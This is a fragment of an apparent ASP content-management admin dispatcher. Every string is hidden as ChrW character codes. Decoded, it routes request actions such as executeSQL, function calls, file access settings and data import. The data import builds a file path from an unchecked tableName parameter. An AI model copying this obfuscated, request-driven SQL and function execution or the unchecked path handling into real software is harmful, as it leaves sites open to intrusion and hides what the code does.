elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(115)&ChrW(97)&ChrW(118)&ChrW(101)&ChrW(82)&ChrW(111)&ChrW(98)&ChrW(111)&ChrW(116)&ChrW(115) then
call saveRobots()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(100)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(116)&ChrW(101)&ChrW(65)&ChrW(108)&ChrW(108)&ChrW(77)&ChrW(97)&ChrW(107)&ChrW(101)&ChrW(72)&ChrW(116)&ChrW(109)&ChrW(108) then
call deleteAllMakeHtml()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(105)&ChrW(115)&ChrW(79)&ChrW(112)&ChrW(101)&ChrW(110)&ChrW(84)&ChrW(101)&ChrW(109)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(116)&ChrW(101) then
call isOpenTemplate()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(101)&ChrW(120)&ChrW(101)&ChrW(99)&ChrW(117)&ChrW(116)&ChrW(101)&ChrW(83)&ChrW(81)&ChrW(76) then
call executeSQL()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(102)&ChrW(117)&ChrW(110)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110) then
call callFunction()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(102)&ChrW(117)&ChrW(110)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(50) then
call callFunction2()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(102)&ChrW(117)&ChrW(110)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(95)&ChrW(99)&ChrW(97)&ChrW(105) then
call callFunction_cai()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(102)&ChrW(105)&ChrW(108)&ChrW(101)&ChrW(95)&ChrW(115)&ChrW(101)&ChrW(116)&ChrW(65)&ChrW(99)&ChrW(99)&ChrW(101)&ChrW(115)&ChrW(115) then
call callfile_setAccess()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(115)&ChrW(101)&ChrW(116)&ChrW(65)&ChrW(99)&ChrW(99)&ChrW(101)&ChrW(115)&ChrW(115) then
call resetAccessData()    
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(105)&ChrW(109)&ChrW(112)&ChrW(111)&ChrW(114)&ChrW(116)&ChrW(65)&ChrW(114)&ChrW(116)&ChrW(105)&ChrW(99)&ChrW(108)&ChrW(101) then
call importArticle()  
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(105)&ChrW(109)&ChrW(112)&ChrW(111)&ChrW(114)&ChrW(116)&ChrW(68)&ChrW(97)&ChrW(116)&ChrW(97) then
a=ChrW(92)&ChrW(105)&ChrW(110)&ChrW(115)&ChrW(116)&ChrW(97)&ChrW(108)&ChrW(108)&ChrW(92)&ChrW(119)&ChrW(101)&ChrW(98)&ChrW(100)&ChrW(97)&ChrW(116)&ChrW(97)&ChrW(92) & request(ChrW(116)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(78)&ChrW(97)&ChrW(109)&ChrW(101))
call importData(request(ChrW(116)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(78)&ChrW(97)&ChrW(109)&ChrW(101)),a,"")
call eerr(ChrW(25552)&ChrW(31034),ChrW(23436)&ChrW(25104)&ChrW(33))
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(105)&ChrW(109)&ChrW(112)&ChrW(111)&ChrW(114)&ChrW(116)&ChrW(83)&ChrW(104)&ChrW(101)&ChrW(83)&ChrW(104)&ChrW(105) then
call importSheShi()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(108)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110) then
call login()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(79)&ChrW(117)&ChrW(116) then
call adminOut()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(110)&ChrW(100)&ChrW(101)&ChrW(120) then
call adminIndex()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(99)&ChrW(108)&ChrW(101)&ChrW(97)&ChrW(114)&ChrW(67)&ChrW(97)&ChrW(99)&ChrW(104)&ChrW(101) then
call clearCache()
else
call displayAdminLogin()
end if 
end sub
%> 
